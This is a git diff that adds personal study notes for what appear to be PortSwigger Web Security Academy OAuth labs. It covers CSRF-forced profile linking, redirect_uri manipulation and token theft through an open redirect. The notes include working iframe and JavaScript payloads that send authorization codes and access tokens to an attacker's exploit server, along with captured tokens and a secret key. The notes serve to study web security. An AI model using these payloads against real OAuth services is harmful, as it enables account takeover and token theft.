@@ -4973,9 +4973,68 @@ Response: Communication timed out. (chunked size is 5)
     ``` 
   - `GET /client/CLIENT-ID/logo` request > repeater > **replace the client-id in the path**  
     Response:  "SecretAccessKey" : "h93ebR3rsw8vL3feotaGS33UxcTl48WHkyI74e5L"
-- ddd
-- ddd
-- ddd
+- **Forced OAuth** profile linking
+  - use a **CSRF** attack to attach your own **social media profile** to the admin user's account on the blog website  
+  - Login to account then intercept traffic when clicking **"Attach a social profile"**
+  - forward the request until `GET /oauth-linking?code=`
+  - `GET /oauth-linking?code=h08oVjWcXVtWt0auaY0Kh1aBqaOzbQg2MefsFMbR9zR` > copy URL > drop the request > Turn off proxy interception > log out from website
+  - Exploit server > store > deliver the exploit to the victim
+    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>`
+  - Log in with social media > gain the admin access  
+- OAuth account hijacking via **redirect_uri**
+  - steal an authorization code associated with the admin user
+  - Login with social media account, traffic in belows (Note: Must use chrome browser)
+    ```
+    https://oauth-0a050013032898458055f68d022600cd.oauth-server.net/auth/WAZDhDJueqCB76c4MZ4qG
+    https://0ac30038034d98308043f81400dd00af.web-security-academy.net/oauth-callback?code=It0owEZzfwoXvPBv1Er5k5mIJBDdfXjunAPubofYKER
+    ```
+  - identify the most recent authorization request
+    `https://oauth-0a050013032898458055f68d022600cd.oauth-server.net/auth?client_id=zvc1pqvpfev8x4197gf1z&redirect_uri=https://0ac30038034d98308043f81400dd00af.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`
+  - you can submit any arbitrary value as the redirect_uri without encountering an error
+  - Exploit server > deliver paylaod to victim
+    ```
+      <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+    ```
+  - view access log, code leak `GET /?code=QyAubFKuWz8ORcfJJg9IIJb2GbPmkbgSPSE7uy14lvp`
+  - browse to `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`  
+- **Stealing OAuth access tokens** via an open redirect
+  - identify an open redirect on the blog website and use this to steal an access token for the admin user's account
+  - Login with social media account > logout > login > We are now redirecting you to login with social media...
+  - change the redirect_uri to arbitrary value> 400 Bad request  
+    Cannot supply an external domain as redirect_uri because it's being validated against a whitelist
+    ```
+    GET /auth?client_id=yztb07xfp85gedyy7c6y5&redirect_uri=https://0a6000c2031410a481ffa7cf004c0014.web-security-academy.net/oauth-callback&response_type=token&nonce=-2035028382&scope=openid%20profile%20email
+    ```
+  - Confirm the directory traversal vulnerability > redirect to post page
+    ```
+    GET /auth?client_id=yztb07xfp85gedyy7c6y5&redirect_uri=https://0a6000c2031410a481ffa7cf004c0014.web-security-academy.net/oauth-callback/../post?postId=7&response_type=token&nonce=-611991614&scope=openid%20profile%20email
+    ```
+  - Identify **open redirect flaw** > 302 found
+    GET /post/next?path=/post?postId=8 > `GET /post/next?path=https://google.com` > redirect to google page
+  - Exploit server > store > deliver to victim 
+    ```
+    <script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit- 
+      server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+    </script>
+
+    X1: oauth-0a4600ff036410bc81dca5a6025a00a6.oauth-server.net
+    X2: https://0a6000c2031410a481ffa7cf004c0014.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0af7008f0310109b81d2a67501ea00da.exploit-server.net/exploit/
+    ```
+  - Access log > > steal access token
+    `GET /?access_token=hPn6JGykUIPecMPCfs_DtWN7O_PoXHdKPtSE5ZiR-Y6&expires_in=3600&token_type=Bearer`
+  - GET /me > repeater > change the `Authorization: Bearer` > 200 Ok (apikey)
+  - Note:
+    ```
+    The initial redirect (if part) is designed to initiate the OAuth flow to retrieve the token from the authorization server.
+
+    The else part occurs after the user is redirected back with the token in the URL fragment. Since fragments are not sent in HTTP requests, the attacker uses JavaScript to move the token into the query string (which is sent to the server), thus "stealing" the 
+    token and sending it to the attacker's server.
+    ```
 - ddd
 
 ## JWT Attacks
